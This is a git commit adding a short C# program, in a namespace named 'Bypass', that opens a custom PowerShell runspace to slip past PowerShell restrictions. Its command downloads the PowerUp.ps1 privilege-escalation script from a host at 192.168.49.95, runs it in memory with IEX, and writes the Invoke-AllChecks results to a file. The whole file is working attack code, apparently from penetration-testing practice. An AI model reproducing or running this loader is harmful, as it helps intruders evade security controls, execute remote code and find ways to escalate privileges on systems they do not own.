6d180a06d0ce8f2416ee74b50a800ab00142c9a9
Shantanu Khandelwal <shantanu561993@gmail.com>
2021-01-26 15:32:50 +0800

    Create CustomRunspace.cs

---
+++ CustomRunspace.cs
@@ -0,0 +1,22 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
+            cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.95/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test.txt";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            rs.Close();
+
+        }
+    }
+}
